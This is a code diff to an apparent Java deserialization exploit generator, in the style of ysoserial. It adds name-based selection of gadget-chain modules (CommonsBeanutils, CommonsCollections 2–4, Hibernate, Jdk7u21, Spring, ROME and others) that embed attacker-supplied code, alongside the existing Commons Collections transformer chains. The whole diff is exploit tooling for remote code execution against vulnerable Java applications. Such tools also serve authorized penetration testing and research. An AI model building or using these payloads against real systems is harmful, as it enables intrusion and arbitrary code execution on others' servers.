@@ -54,24 +54,38 @@ public class Generator {
     }
 
     public byte[] mainParse(final JSONObject root) throws Exception {
-        Transformer[] transformers = parseExec(root);
+        // Final payload goes here.
+        Object object = null;
+        Object payload = null;
+        ObjectPayloadRaw exploitModule = null;
 
-        // Terminating transformer?
-        final Transformer[] terminal = Commons1Gadgets.getTerminalTransformer(
-                !root.has("valid") || Utils.getAsBoolean(root, "valid"));
-        transformers = Commons1Gadgets.mergeTrans(transformers, terminal);
+        // Not a transformer object?
+        if (root.has("javassist")){
+            final String module = root.getString("javassist");
+            exploitModule = getExploitModule(module);
+            payload = exploitModule.getObject(root.getString("code"));
 
-        // Exploit module.
-        int module = 1;
-        if (root.has("module")){
-            module = root.getInt("module");
+        } else {
+            // Commons {1,5,6} Transformer based exploits - the core.
+            Transformer[] transformers = parseExec(root);
+
+            // Terminating transformer?
+            final Transformer[] terminal = Commons1Gadgets.getTerminalTransformer(
+                    !root.has("valid") || Utils.getAsBoolean(root, "valid"));
+            transformers = Commons1Gadgets.mergeTrans(transformers, terminal);
+
+            // Exploit module.
+            int module = 1;
+            if (root.has("module")) {
+                module = root.getInt("module");
+            }
+
+            exploitModule = getExploitModule(module);
+            payload = exploitModule.getObject(transformers);
         }
 
-        final ObjectPayloadRaw exploitModule = getExploitModule(module);
-        final Object payload = exploitModule.getObject(transformers);
-
         // Final payload goes here.
-        Object object = payload;
+        object = payload;
 
         // Wrapping collection?
         if (root.has("wrap")){
@@ -152,6 +166,28 @@ public class Generator {
             case 5: return new CommonsCollections5Raw();
             case 6: return new CommonsCollections6Raw();
             default: throw new RuntimeException("Unknown exploit module");
+        }
+    }
+
+    public ObjectPayloadRaw getExploitModule(String name){
+        switch(name){
+            case "cb1": return new CommonsBeanutils1Raw();
+            case "cc2": return new CommonsCollections2Raw();
+            case "cc3": return new CommonsCollections3Raw();
+            case "cc4": return new CommonsCollections4Raw();
+
+            case "hibernate": return new Hibernate1Raw();
+            case "weld": return new JavassistWeld1Raw();
+            case "jboss": return new JBossInterceptors1Raw();
+            case "jdk7": return new Jdk7u21Raw();
+            case "json": return new JSON1Raw();
+
+            case "rhino": return new MozillaRhino1Raw();
+            case "rome": return new ROMERaw();
+            case "spring1": return new Spring1Raw();
+            case "spring2": return new Spring2Raw();
+
+            default: throw new RuntimeException("Unknown exploit module: " + name);
         }
     }
 
